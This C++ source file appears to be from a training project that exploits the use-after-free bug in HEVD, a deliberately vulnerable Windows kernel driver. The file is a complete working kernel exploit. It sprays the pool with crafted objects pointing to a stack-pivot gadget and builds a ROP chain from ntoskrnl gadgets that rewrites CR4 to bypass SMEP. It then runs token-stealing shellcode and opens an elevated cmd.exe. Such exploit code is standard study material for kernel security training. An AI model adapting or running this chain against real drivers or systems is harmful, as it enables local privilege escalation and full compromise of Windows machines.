/*
 * @Date: 2026-10-21 14:26:21
 * @LastEditors: joe1sn joe1sn23333@gmail.com
 * @LastEditTime: 2026-10-22 11:40:49
 * @FilePath: \WinX_HEVD_EXP\src\exp\uaf.cpp
 */
#include "include/exp/uaf.hpp"
#include "include/common/shellcode.hpp"
#include "include/common/memtools.hpp"
#include "include/common/gadget.hpp"
#include <iostream>


namespace exploit::uaf
{
    void AllocatePool(HANDLE hDevice) {
        DWORD result;
        if (!DeviceIoControl(hDevice, IOCTL_ALLOCATE,
            NULL, 0,
            NULL, 0,
            &result, NULL)) {
            // std::cout << "[x] AllocatePool Failed: " << GetLastError() << "\n";
            // exit(-1);
        }
    }
    void UsePool(HANDLE hDevice) {
        DWORD result;
        if (!DeviceIoControl(hDevice, IOCTL_USE,
            NULL, 0,
            NULL, 0,
            &result, NULL)) {
            std::cout << "[x] UsePool Failed: " << GetLastError() << "\n";
            exit(-1);
        }
    }
    void FreePool(HANDLE hDevice) {
        DWORD result;
        if (!DeviceIoControl(hDevice, IOCTL_FREE,
            NULL, 0,
            NULL, 0,
            &result, NULL)) {
            std::cout << "[x] AllocatePool Failed: " << GetLastError() << "\n";
            exit(-1);
        }
    }
    void AllocateObject(HANDLE hDevice, unsigned int size) {
        auto buffer = new char[size];
        memset(buffer, 'C', size);
        *(ULONG_PTR*)(buffer) = lpStackPivot;
        DWORD result;
        if (!DeviceIoControl(hDevice, IOCTL_ALLOCATE_OBJECT,
            buffer, size,
            NULL, 0,
            &result, NULL)) {
            std::cout << "[x] AllocateObject Failed: " << GetLastError() << "\n";
            exit(-1);
        }
    }

    void Exploit(HANDLE hDevice) {
        lpSpace = VirtualAlloc(NULL, sizeof(exploit::shellcode::SpawnTokenWithoutAnyProtect) + 0x10, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        RtlCopyMemory(lpSpace, exploit::shellcode::SpawnTokenWithoutAnyProtect, sizeof(exploit::shellcode::SpawnTokenWithoutAnyProtect));
        printf("[*] Shellcode address: %p\n", lpSpace);

        unsigned long long base = exploit::memtools::ulGetKernelBase((PCHAR)"ntoskrnl.exe");
        unsigned long long pop_rcx = base + exploit::gadget::X_19045_2006::pop_rcx_ret;
        unsigned long long mov_cr4_rcx = base + exploit::gadget::X_19045_2006::mov_cr4_rcx_ret;
        lpStackPivot = base + exploit::gadget::X_19045_2006::mov_esp_add_ret;
        printf("[*] pop rcx; ret: %p\n[*] mov cr4, rcx; ret: %p\n[*] mov esp 0x, add, ret: %p\n", pop_rcx, mov_cr4_rcx, lpStackPivot);
        ULONG_PTR stackAddr = FakeStackAddr - 0x1000;
        lpFakeStack = VirtualAlloc((LPVOID)stackAddr, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        printf("[*] Fake stack addr: %p\n", lpFakeStack);

        printf("[*] Start set ROP\n");
        *(unsigned long long*)(FakeStackAddr + 0x28) = (unsigned long long)pop_rcx;
        *(unsigned long long*)(FakeStackAddr + 0x30) = (unsigned long long)exploit::gadget::X_19045_2006::bypassSMEPVal;
        *(unsigned long long*)(FakeStackAddr + 0x38) = (unsigned long long)mov_cr4_rcx;
        *(unsigned long long*)(FakeStackAddr + 0x40) = (unsigned long long)lpSpace;

        std::cout << "[+] Fragment agline\n";
        for (size_t i = 0; i < 0x2000; i++) {
            if (i % 100 == 0)
                std::cout << ".";
            AllocateObject(hDevice, 0x60);
        }

        AllocatePool(hDevice);
        std::cout << "[+] Allocated Pool, next to free it\n";
        FreePool(hDevice);
        std::cout << "[+] Freed Pool, next to spray\n";
        for (size_t i = 0; i < 0x10000; i++) {
            if (i % 100 == 0)
                std::cout << ".";
            AllocateObject(hDevice, 0x60);
        }

        std::cout << std::endl;
        std::cout << "[+] Wish luck enough to fill the hole, now use it\n";

        if (!VirtualLock(lpFakeStack, 0x15000)) {
            std::cout << "[x] VirtualLock lpFakeStack Failed\n";
            exit(-1);
        }
        UsePool(hDevice);
        system("cmd.exe");
    }


} // namespace exploit